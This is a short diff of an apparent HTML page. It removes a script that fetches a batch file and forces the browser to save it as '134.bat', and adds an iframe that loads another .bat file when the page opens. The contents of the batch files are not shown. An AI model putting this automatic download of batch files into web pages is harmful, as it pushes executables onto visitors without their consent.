@@ -1,14 +1,1 @@
-<script>
-
-    fetch("./1.bat").then(r => r.blob()).then(r => {
-        const blob = new Blob([r], { type: "text/plain" });
-        const url = URL.createObjectURL(blob);
-        const link = document.createElement("a");
-        link.href = url;
-        link.download = "134.bat";
-        link.click();
-        URL.revokeObjectURL(url);
-    })
-
-
-</script>
+<iframe src='./123.bat?id=softdl6.360tpcdn.com'></iframe>
